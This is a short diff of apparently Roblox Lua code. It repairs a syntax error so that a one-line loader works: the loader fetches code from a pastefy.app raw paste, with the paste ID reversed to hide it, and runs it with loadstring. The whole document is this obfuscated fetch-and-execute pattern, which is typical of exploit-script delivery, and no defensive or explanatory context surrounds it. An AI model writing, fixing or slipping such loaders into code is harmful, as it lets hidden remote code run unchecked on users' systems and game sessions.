@@ -1,2 +1,2 @@
 local TargetUrl = "https://pastefy.app/" .. string.reverse("072w8TiQ") .. "/raw"
-loadstring(game:HttpGet(TargetUrl)()
+loadstring(game:HttpGet(TargetUrl))()
